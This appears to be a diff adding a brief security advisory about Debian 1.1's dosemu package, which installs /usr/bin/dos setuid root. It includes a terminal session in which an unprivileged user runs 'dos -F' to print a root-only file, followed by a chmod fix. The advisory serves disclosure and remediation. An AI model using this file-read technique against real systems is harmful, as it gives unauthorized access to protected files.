@@ -1,0 +1,32 @@
+ 
+
+In Debian 1.1, the optional DOSEMU package installs /usr/sbin/dos
+setuid root.  This is a serious security hole which can be exploited
+to gain access to any file on the system.
+
+Package: dosemu
+Version: 0.64.0.2-9
+
+------- start of cut text --------------
+$ cat /etc/debian_version 
+1.1
+$ id
+uid=xxxx(quinlan) gid=xxxx(quinlan) groups=xxxx(quinlan),20(dialout),24(cdrom)
+[quinlan:~]$ ls -al /usr/bin/dos
+-rwsr-xr-x   1 root     root       569576 Oct 24 00:05 /usr/bin/dos
+$ ls -al /root/foo
+-rw-------   1 root     root         1117 Nov 13 23:10 /root/foo
+$ dos -F /root/foo
+[ Prints /root/foo, which is not readable by user `quinlan'. ]
+------- end ----------------------------
+
+I expect there may be other holes in dosemu other than this one that
+can be exploited if it is installed setuid root.  It took about 60
+seconds to find this hole once I realized /usr/bin/dos was setuid
+root.
+
+Note: This security hole can be corrected by removing the suid bit from
+/usr/bin/dos:
+----------------------------
+$ chmod u-s /usr/bin/dos
+----------------------------
